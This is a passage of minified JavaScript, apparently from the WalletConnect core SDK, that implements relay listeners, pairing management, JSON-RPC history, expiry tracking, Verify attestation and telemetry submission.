this.onMessageEvent(a)}else Jd(e)&&this.events.emit(js.message_ack,e)}async onMessageEvent(e){await this.shouldIgnoreMessageEvent(e)||(this.events.emit(js.message,e),await this.recordMessageEvent(e))}async acknowledgePayload(e){const t=bl(e.id,!0);await this.provider.connection.send(t)}unregisterProviderListeners(){this.provider.off(Oc.payload,this.onPayloadHandler),this.provider.off(Oc.connect,this.onConnectHandler),this.provider.off(Oc.disconnect,this.onDisconnectHandler),this.provider.off(Oc.error,this.onProviderErrorHandler),clearTimeout(this.pingTimeout)}async registerEventListeners(){let e=await wj();i8e(async t=>{e!==t&&(e=t,t?await this.transportOpen().catch(i=>this.logger.error(i,i?.message)):(this.hasExperiencedNetworkDisruption=!0,await this.transportDisconnect(),this.transportExplicitlyClosed=!1))})}async onProviderDisconnect(){await this.subscriber.stop(),clearTimeout(this.pingTimeout),this.events.emit(js.disconnect),this.connectionAttemptInProgress=!1,!this.transportExplicitlyClosed&&(this.reconnectTimeout||this.connectPromise||(this.reconnectTimeout=setTimeout(async()=>{clearTimeout(this.reconnectTimeout),await this.transportOpen().catch(e=>this.logger.error(e,e?.message))},fe.toMiliseconds(z8e))))}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}async toEstablishConnection(){await this.confirmOnlineStateOrThrow(),!this.connected&&await this.transportOpen()}};var exe=Object.defineProperty,Hj=Object.getOwnPropertySymbols,txe=Object.prototype.hasOwnProperty,rxe=Object.prototype.propertyIsEnumerable,Vj=(r,e,t)=>e in r?exe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Kj=(r,e)=>{for(var t in e||(e={}))txe.call(e,t)&&Vj(r,t,e[t]);if(Hj)for(var t of Hj(e))rxe.call(e,t)&&Vj(r,t,e[t]);return r};let s2=class extends Owe{constructor(e,t,i,n=$d,s=void 0){super(e,t,i,n),this.core=e,this.logger=t,this.name=i,this.map=new Map,this.version=W8e,this.cached=[],this.initialized=!1,this.storagePrefix=$d,this.recentlyDeleted=[],this.recentlyDeletedLimit=200,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(o=>{this.getKey&&o!==null&&!Vo(o)?this.map.set(this.getKey(o),o):O6e(o)?this.map.set(o.id,o):B6e(o)&&this.map.set(o.topic,o)}),this.cached=[],this.initialized=!0)},this.set=async(o,a)=>{this.isInitialized(),this.map.has(o)?await this.update(o,a):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:o,value:a}),this.map.set(o,a),await this.persist())},this.get=o=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:o}),this.getData(o)),this.getAll=o=>(this.isInitialized(),o?this.values.filter(a=>Object.keys(o).every(c=>N8e(a[c],o[c]))):this.values),this.update=async(o,a)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:o,update:a});const c=Kj(Kj({},this.getData(o)),a);this.map.set(o,c),await this.persist()},this.delete=async(o,a)=>{this.isInitialized(),this.map.has(o)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:o,reason:a}),this.map.delete(o),this.addToRecentlyDeleted(o),await this.persist())},this.logger=gr(t,this.name),this.storagePrefix=n,this.getKey=s}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const t=this.map.get(e);if(!t){if(this.recentlyDeleted.includes(e)){const{message:n}=st("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(n),new Error(n)}const{message:i}=st("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}return t}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:t}=st("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}},ixe=class{constructor(e,t){this.core=e,this.logger=t,this.name=Z8e,this.version=Y8e,this.events=new T0,this.initialized=!1,this.storagePrefix=$d,this.ignoredPayloadTypes=[e0],this.registeredMethods=[],this.init=async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))},this.register=({methods:i})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...i])]},this.create=async i=>{this.isInitialized();const n=Nk(),s=await this.core.crypto.setSymKey(n),o=ms(fe.FIVE_MINUTES),a={protocol:hX},c={topic:s,expiry:o,relay:a,active:!1,methods:i?.methods},l=dj({protocol:this.core.protocol,version:this.core.version,topic:s,symKey:n,relay:a,expiryTimestamp:o,methods:i?.methods});return this.events.emit(c1.create,c),this.core.expirer.set(s,o),await this.pairings.set(s,c),await this.core.relayer.subscribe(s,{transportType:i?.transportType}),{topic:s,uri:l}},this.pair=async i=>{this.isInitialized();const n=this.core.eventClient.createEvent({properties:{topic:i?.uri,trace:[ed.pairing_started]}});this.isValidPair(i,n);const{topic:s,symKey:o,relay:a,expiryTimestamp:c,methods:l}=uj(i.uri);n.props.properties.topic=s,n.addTrace(ed.pairing_uri_validation_success),n.addTrace(ed.pairing_uri_not_expired);let u;if(this.pairings.keys.includes(s)){if(u=this.pairings.get(s),n.addTrace(ed.existing_pairing),u.active)throw n.setError(Nh.active_pairing_already_exists),new Error(`Pairing already exists: ${s}. Please try again with a new connection URI.`);n.addTrace(ed.pairing_not_expired)}const d=c||ms(fe.FIVE_MINUTES),h={topic:s,relay:a,expiry:d,active:!1,methods:l};this.core.expirer.set(s,d),await this.pairings.set(s,h),n.addTrace(ed.store_new_pairing),i.activatePairing&&await this.activate({topic:s}),this.events.emit(c1.create,h),n.addTrace(ed.emit_inactive_pairing),this.core.crypto.keychain.has(s)||await this.core.crypto.setSymKey(o,s),n.addTrace(ed.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{n.setError(Nh.no_internet_connection)}try{await this.core.relayer.subscribe(s,{relay:a})}catch(f){throw n.setError(Nh.subscribe_pairing_topic_failure),f}return n.addTrace(ed.subscribe_pairing_topic_success),h},this.activate=async({topic:i})=>{this.isInitialized();const n=ms(fe.FIVE_MINUTES);this.core.expirer.set(i,n),await this.pairings.update(i,{active:!0,expiry:n})},this.ping=async i=>{this.isInitialized(),await this.isValidPing(i),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:n}=i;if(this.pairings.keys.includes(n)){const s=await this.sendRequest(n,"wc_pairingPing",{}),{done:o,resolve:a,reject:c}=Qp();this.events.once(qr("pairing_ping",s),({error:l})=>{l?c(l):a()}),await o()}},this.updateExpiry=async({topic:i,expiry:n})=>{this.isInitialized(),await this.pairings.update(i,{expiry:n})},this.updateMetadata=async({topic:i,metadata:n})=>{this.isInitialized(),await this.pairings.update(i,{peerMetadata:n})},this.getPairings=()=>(this.isInitialized(),this.pairings.values),this.disconnect=async i=>{this.isInitialized(),await this.isValidDisconnect(i);const{topic:n}=i;this.pairings.keys.includes(n)&&(await this.sendRequest(n,"wc_pairingDelete",Hi("USER_DISCONNECTED")),await this.deletePairing(n))},this.formatUriFromPairing=i=>{this.isInitialized();const{topic:n,relay:s,expiry:o,methods:a}=i,c=this.core.crypto.keychain.get(n);return dj({protocol:this.core.protocol,version:this.core.version,topic:n,symKey:c,relay:s,expiryTimestamp:o,methods:a})},this.sendRequest=async(i,n,s)=>{const o=jn(n,s),a=await this.core.crypto.encode(i,o),c=yb[n].req;return this.core.history.set(i,o),this.core.relayer.publish(i,a,c),o.id},this.sendResult=async(i,n,s)=>{const o=bl(i,s),a=await this.core.crypto.encode(n,o),c=await this.core.history.get(n,i),l=yb[c.request.method].res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)},this.sendError=async(i,n,s)=>{const o=Ap(i,s),a=await this.core.crypto.encode(n,o),c=await this.core.history.get(n,i),l=yb[c.request.method]?yb[c.request.method].res:yb.unregistered_method.res;await this.core.relayer.publish(n,a,l),await this.core.history.resolve(o)},this.deletePairing=async(i,n)=>{await this.core.relayer.unsubscribe(i),await Promise.all([this.pairings.delete(i,Hi("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(i),n?Promise.resolve():this.core.expirer.del(i)])},this.cleanup=async()=>{const i=this.pairings.getAll().filter(n=>yf(n.expiry));await Promise.all(i.map(n=>this.deletePairing(n.topic)))},this.onRelayEventRequest=i=>{const{topic:n,payload:s}=i;switch(s.method){case"wc_pairingPing":return this.onPairingPingRequest(n,s);case"wc_pairingDelete":return this.onPairingDeleteRequest(n,s);default:return this.onUnknownRpcMethodRequest(n,s)}},this.onRelayEventResponse=async i=>{const{topic:n,payload:s}=i,o=(await this.core.history.get(n,s.id)).request.method;switch(o){case"wc_pairingPing":return this.onPairingPingResponse(n,s);default:return this.onUnknownRpcMethodResponse(o)}},this.onPairingPingRequest=async(i,n)=>{const{id:s}=n;try{this.isValidPing({topic:i}),await this.sendResult(s,i,!0),this.events.emit(c1.ping,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}},this.onPairingPingResponse=(i,n)=>{const{id:s}=n;setTimeout(()=>{Gi(n)?this.events.emit(qr("pairing_ping",s),{}):wi(n)&&this.events.emit(qr("pairing_ping",s),{error:n.error})},500)},this.onPairingDeleteRequest=async(i,n)=>{const{id:s}=n;try{this.isValidDisconnect({topic:i}),await this.deletePairing(i),this.events.emit(c1.delete,{id:s,topic:i})}catch(o){await this.sendError(s,i,o),this.logger.error(o)}},this.onUnknownRpcMethodRequest=async(i,n)=>{const{id:s,method:o}=n;try{if(this.registeredMethods.includes(o))return;const a=Hi("WC_METHOD_UNSUPPORTED",o);await this.sendError(s,i,a),this.logger.error(a)}catch(a){await this.sendError(s,i,a),this.logger.error(a)}},this.onUnknownRpcMethodResponse=i=>{this.registeredMethods.includes(i)||this.logger.error(Hi("WC_METHOD_UNSUPPORTED",i))},this.isValidPair=(i,n)=>{var s;if(!ma(i)){const{message:a}=st("MISSING_OR_INVALID",`pair() params: ${i}`);throw n.setError(Nh.malformed_pairing_uri),new Error(a)}if(!R6e(i.uri)){const{message:a}=st("MISSING_OR_INVALID",`pair() uri: ${i.uri}`);throw n.setError(Nh.malformed_pairing_uri),new Error(a)}const o=uj(i?.uri);if(!((s=o?.relay)!=null&&s.protocol)){const{message:a}=st("MISSING_OR_INVALID","pair() uri#relay-protocol");throw n.setError(Nh.malformed_pairing_uri),new Error(a)}if(!(o!=null&&o.symKey)){const{message:a}=st("MISSING_OR_INVALID","pair() uri#symKey");throw n.setError(Nh.malformed_pairing_uri),new Error(a)}if(o!=null&&o.expiryTimestamp&&fe.toMiliseconds(o?.expiryTimestamp)<Date.now()){n.setError(Nh.pairing_expired);const{message:a}=st("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(a)}},this.isValidPing=async i=>{if(!ma(i)){const{message:s}=st("MISSING_OR_INVALID",`ping() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)},this.isValidDisconnect=async i=>{if(!ma(i)){const{message:s}=st("MISSING_OR_INVALID",`disconnect() params: ${i}`);throw new Error(s)}const{topic:n}=i;await this.isValidPairingTopic(n)},this.isValidPairingTopic=async i=>{if(!Zn(i,!1)){const{message:n}=st("MISSING_OR_INVALID",`pairing topic should be a string: ${i}`);throw new Error(n)}if(!this.pairings.keys.includes(i)){const{message:n}=st("NO_MATCHING_KEY",`pairing topic doesn't exist: ${i}`);throw new Error(n)}if(yf(this.pairings.get(i).expiry)){await this.deletePairing(i);const{message:n}=st("EXPIRED",`pairing topic: ${i}`);throw new Error(n)}},this.core=e,this.logger=gr(t,this.name),this.pairings=new s2(this.core,this.logger,this.name,this.storagePrefix)}get context(){return Or(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(js.message,async e=>{const{topic:t,message:i,transportType:n}=e;if(!this.pairings.keys.includes(t)||n===an.link_mode||this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(i)))return;const s=await this.core.crypto.decode(t,i);try{N0(s)?(this.core.history.set(t,s),this.onRelayEventRequest({topic:t,payload:s})):Jd(s)&&(await this.core.history.resolve(s),await this.onRelayEventResponse({topic:t,payload:s}),this.core.history.delete(t,s.id))}catch(o){this.logger.error(o)}})}registerExpirerEvents(){this.core.expirer.on(Kc.expired,async e=>{const{topic:t}=$Q(e.target);t&&this.pairings.keys.includes(t)&&(await this.deletePairing(t,!0),this.events.emit(c1.expire,{topic:t}))})}},nxe=class extends Nwe{constructor(e,t){super(e,t),this.core=e,this.logger=t,this.records=new Map,this.events=new en.EventEmitter,this.name=J8e,this.version=Q8e,this.cached=[],this.initialized=!1,this.storagePrefix=$d,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(i=>this.records.set(i.id,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)},this.set=(i,n,s)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:i,request:n,chainId:s}),this.records.has(n.id))return;const o={id:n.id,topic:i,request:{method:n.method,params:n.params||null},chainId:s,expiry:ms(fe.THIRTY_DAYS)};this.records.set(o.id,o),this.persist(),this.events.emit(Ul.created,o)},this.resolve=async i=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:i}),!this.records.has(i.id))return;const n=await this.getRecord(i.id);typeof n.response>"u"&&(n.response=wi(i)?{error:i.error}:{result:i.result},this.records.set(n.id,n),this.persist(),this.events.emit(Ul.updated,n))},this.get=async(i,n)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:i,id:n}),await this.getRecord(n)),this.delete=(i,n)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:n}),this.values.forEach(s=>{if(s.topic===i){if(typeof n<"u"&&s.id!==n)return;this.records.delete(s.id),this.events.emit(Ul.deleted,s)}}),this.persist()},this.exists=async(i,n)=>(this.isInitialized(),this.records.has(n)?(await this.getRecord(n)).topic===i:!1),this.on=(i,n)=>{this.events.on(i,n)},this.once=(i,n)=>{this.events.once(i,n)},this.off=(i,n)=>{this.events.off(i,n)},this.removeListener=(i,n)=>{this.events.removeListener(i,n)},this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(t=>{if(typeof t.response<"u")return;const i={topic:t.topic,request:jn(t.request.method,t.request.params,t.id),chainId:t.chainId};return e.push(i)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const t=this.records.get(e);if(!t){const{message:i}=st("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(Ul.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:t}=st("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(Ul.created,e=>{const t=Ul.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(Ul.updated,e=>{const t=Ul.updated;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.events.on(Ul.deleted,e=>{const t=Ul.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,record:e})}),this.core.heartbeat.on(Ks.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(t=>{fe.toMiliseconds(t.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${t.id}`),this.records.delete(t.id),this.events.emit(Ul.deleted,t,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}},sxe=class extends Mwe{constructor(e,t){super(e,t),this.core=e,this.logger=t,this.expirations=new Map,this.events=new en.EventEmitter,this.name=X8e,this.version=e9e,this.cached=[],this.initialized=!1,this.storagePrefix=$d,this.init=async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(i=>this.expirations.set(i.target,i)),this.cached=[],this.registerEventListeners(),this.initialized=!0)},this.has=i=>{try{const n=this.formatTarget(i);return typeof this.getExpiration(n)<"u"}catch{return!1}},this.set=(i,n)=>{this.isInitialized();const s=this.formatTarget(i),o={target:s,expiry:n};this.expirations.set(s,o),this.checkExpiry(s,o),this.events.emit(Kc.created,{target:s,expiration:o})},this.get=i=>{this.isInitialized();const n=this.formatTarget(i);return this.getExpiration(n)},this.del=i=>{if(this.isInitialized(),this.has(i)){const n=this.formatTarget(i),s=this.getExpiration(n);this.expirations.delete(n),this.events.emit(Kc.deleted,{target:n,expiration:s})}},this.on=(i,n)=>{this.events.on(i,n)},this.once=(i,n)=>{this.events.once(i,n)},this.off=(i,n)=>{this.events.off(i,n)},this.removeListener=(i,n)=>{this.events.removeListener(i,n)},this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return gye(e);if(typeof e=="number")return mye(e);const{message:t}=st("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(t)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(Kc.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:t}=st("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(t),new Error(t)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const t=this.expirations.get(e);if(!t){const{message:i}=st("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(i),new Error(i)}return t}checkExpiry(e,t){const{expiry:i}=t;fe.toMiliseconds(i)-Date.now()<=0&&this.expire(e,t)}expire(e,t){this.expirations.delete(e),this.events.emit(Kc.expired,{target:e,expiration:t})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,t)=>this.checkExpiry(t,e))}registerEventListeners(){this.core.heartbeat.on(Ks.pulse,()=>this.checkExpirations()),this.events.on(Kc.created,e=>{const t=Kc.created;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Kc.expired,e=>{const t=Kc.expired;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()}),this.events.on(Kc.deleted,e=>{const t=Kc.deleted;this.logger.info(`Emitting ${t}`),this.logger.debug({type:"event",event:t,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}},oxe=class extends Dwe{constructor(e,t,i){super(e,t,i),this.core=e,this.logger=t,this.store=i,this.name=t9e,this.verifyUrlV3=i9e,this.storagePrefix=$d,this.version=dX,this.init=async()=>{var n;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&fe.toMiliseconds((n=this.publicKey)==null?void 0:n.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))},this.register=async n=>{if(!d4()||this.isDevEnv)return;const s=window.location.origin,{id:o,decryptedId:a}=n,c=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${s}&id=${o}&decryptedId=${a}`;try{const l=vn.getDocument(),u=this.startAbortTimer(fe.ONE_SECOND*5),d=await new Promise((h,f)=>{const p=()=>{window.removeEventListener("message",w),l.body.removeChild(g),f("attestation aborted")};this.abortController.signal.addEventListener("abort",p);const g=l.createElement("iframe");g.src=c,g.style.display="none",g.addEventListener("error",p,{signal:this.abortController.signal});const w=m=>{if(m.data&&typeof m.data=="string")try{const x=JSON.parse(m.data);if(x.type==="verify_attestation"){if(u0(x.attestation).payload.id!==o)return;clearInterval(u),l.body.removeChild(g),this.abortController.signal.removeEventListener("abort",p),window.removeEventListener("message",w),h(x.attestation===null?"":x.attestation)}}catch(x){this.logger.warn(x)}};l.body.appendChild(g),window.addEventListener("message",w,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",d),d}catch(l){this.logger.warn(l)}return""},this.resolve=async n=>{if(this.isDevEnv)return"";const{attestationId:s,hash:o,encryptedId:a}=n;if(s===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(s){if(u0(s).payload.id!==a)return;const l=await this.isValidJwtAttestation(s);if(l){if(!l.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return l}}if(!o)return;const c=this.getVerifyUrl(n?.verifyUrl);return this.fetchAttestation(o,c)},this.fetchAttestation=async(n,s)=>{this.logger.debug(`resolving attestation: ${n} from url: ${s}`);const o=this.startAbortTimer(fe.ONE_SECOND*5),a=await fetch(`${s}/attestation/${n}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(o),a.status===200?await a.json():void 0},this.getVerifyUrl=n=>{let s=n||A5;return n9e.includes(s)||(this.logger.info(`verify url: ${s}, not included in trusted list, assigning default: ${A5}`),s=A5),s},this.fetchPublicKey=async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const n=this.startAbortTimer(fe.FIVE_SECONDS),s=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(n),await s.json()}catch(n){this.logger.warn(n)}},this.persistPublicKey=async n=>{this.logger.debug("persisting public key to local storage",n),await this.store.setItem(this.storeKey,n),this.publicKey=n},this.removePublicKey=async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0},this.isValidJwtAttestation=async n=>{const s=await this.getPublicKey();try{if(s)return this.validateAttestation(n,s)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}const o=await this.fetchAndPersistPublicKey();try{if(o)return this.validateAttestation(n,o)}catch(a){this.logger.error(a),this.logger.warn("error validating attestation")}},this.getPublicKey=async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey(),this.fetchAndPersistPublicKey=async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async s=>{const o=await this.fetchPublicKey();o&&(await this.persistPublicKey(o),s(o))});const n=await this.fetchPromise;return this.fetchPromise=void 0,n},this.validateAttestation=(n,s)=>{const o=y6e(n,s.publicKey),a={hasExpired:fe.toMiliseconds(o.exp)<Date.now(),payload:o};if(a.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:a.payload.origin,isScam:a.payload.isScam,isVerified:a.payload.isVerified}},this.logger=gr(t,this.name),this.abortController=new AbortController,this.isDevEnv=lR(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return Or(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),fe.toMiliseconds(e))}},axe=class extends Lwe{constructor(e,t){super(e,t),this.projectId=e,this.logger=t,this.context=s9e,this.registerDeviceToken=async i=>{const{clientId:n,token:s,notificationType:o,enableEncrypted:a=!1}=i,c=`${o9e}/${this.projectId}/clients`;await fetch(c,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:n,type:o,token:s,always_raw:a})})},this.logger=gr(t,this.context)}};var cxe=Object.defineProperty,Gj=Object.getOwnPropertySymbols,lxe=Object.prototype.hasOwnProperty,uxe=Object.prototype.propertyIsEnumerable,Zj=(r,e,t)=>e in r?cxe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Eb=(r,e)=>{for(var t in e||(e={}))lxe.call(e,t)&&Zj(r,t,e[t]);if(Gj)for(var t of Gj(e))uxe.call(e,t)&&Zj(r,t,e[t]);return r};let dxe=class extends Uwe{constructor(e,t,i=!0){super(e,t,i),this.core=e,this.logger=t,this.context=c9e,this.storagePrefix=$d,this.storageVersion=a9e,this.events=new Map,this.shouldPersist=!1,this.init=async()=>{if(!lR())try{const n={eventId:DU(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:TQ(this.core.relayer.protocol,this.core.relayer.version,$k)}}};await this.sendEvent([n])}catch(n){this.logger.warn(n)}},this.createEvent=n=>{const{event:s="ERROR",type:o="",properties:{topic:a,trace:c}}=n,l=DU(),u=this.core.projectId||"",d=Date.now(),h=Eb({eventId:l,timestamp:d,props:{event:s,type:o,properties:{topic:a,trace:c}},bundleId:u,domain:this.getAppDomain()},this.setMethods(l));return this.telemetryEnabled&&(this.events.set(l,h),this.shouldPersist=!0),h},this.getEvent=n=>{const{eventId:s,topic:o}=n;if(s)return this.events.get(s);const a=Array.from(this.events.values()).find(c=>c.props.properties.topic===o);if(a)return Eb(Eb({},a),this.setMethods(a.eventId))},this.deleteEvent=n=>{const{eventId:s}=n;this.events.delete(s),this.shouldPersist=!0},this.setEventListeners=()=>{this.core.heartbeat.on(Ks.pulse,async()=>{this.shouldPersist&&await this.persist(),this.events.forEach(n=>{fe.fromMiliseconds(Date.now())-fe.fromMiliseconds(n.timestamp)>l9e&&(this.events.delete(n.eventId),this.shouldPersist=!0)})})},this.setMethods=n=>({addTrace:s=>this.addTrace(n,s),setError:s=>this.setError(n,s)}),this.addTrace=(n,s)=>{const o=this.events.get(n);o&&(o.props.properties.trace.push(s),this.events.set(n,o),this.shouldPersist=!0)},this.setError=(n,s)=>{const o=this.events.get(n);o&&(o.props.type=s,o.timestamp=Date.now(),this.events.set(n,o),this.shouldPersist=!0)},this.persist=async()=>{await this.core.storage.setItem(this.storageKey,Array.from(this.events.values())),this.shouldPersist=!1},this.restore=async()=>{try{const n=await this.core.storage.getItem(this.storageKey)||[];if(!n.length)return;n.forEach(s=>{this.events.set(s.eventId,Eb(Eb({},s),this.setMethods(s.eventId)))})}catch(n){this.logger.warn(n)}},this.submit=async()=>{if(!this.telemetryEnabled||this.events.size===0)return;const n=[];for(const[s,o]of this.events)o.props.type&&n.push(o);if(n.length!==0)try{if((await this.sendEvent(n)).ok)for(const s of n)this.events.delete(s.eventId),this.shouldPersist=!0}catch(s){this.logger.warn(s)}},this.sendEvent=async n=>{const s=this.getAppDomain()?"":"&sp=desktop";return await fetch(`${u9e}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${$k}${s}`,{method:"POST",body:JSON.stringify(n)})},this.getAppDomain=()=>IQ().url,this.logger=gr(t,this.context),this.telemetryEnabled=i,i?this.restore().then(async()=>{await this.submit(),this.setEventListeners()}):this.persist()}get storageKey(){return this.storagePrefix+this.storageVersion+this.core.customStoragePrefix+"//"+this.context}};var hxe=Object.defineProperty,Yj=Object.getOwnPropertySymbols,fxe=Object.prototype.hasOwnProperty,pxe=Object.prototype.propertyIsEnumerable,Jj=(r,e,t)=>e in r?hxe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Qj=(r,e)=>{for(var t in e||(e={}))fxe.call(e,t)&&Jj(r,t,e[t]);if(Yj)for(var t of Yj(e))pxe.call(e,t)&&Jj(r,t,e[t]);return r};let gxe=class SX extends kwe{constructor(e){var t;super(e),this.protocol=uX,this.version=dX,this.name=Pk,this.events=new en.EventEmitter,this.initialized=!1,this.on=(o,a)=>this.events.on(o,a),this.once=(o,a)=>this.events.once(o,a),this.off=(o,a)=>this.events.off(o,a),this.removeListener=(o,a)=>this.events.removeListener(o,a),this.dispatchEnvelope=({topic:o,message:a,sessionExists:c})=>{if(!o||!a)return;const l={topic:o,message:a,publishedAt:Date.now(),transportType:an.link_mode};this.relayer.onLinkMessageEvent(l,{sessionExists:c})},this.projectId=e?.projectId,this.relayUrl=e?.relayUrl||fX,this.customStoragePrefix=e!=null&&e.customStoragePrefix?`:${e.customStoragePrefix}`:"";const i=ra({level:typeof 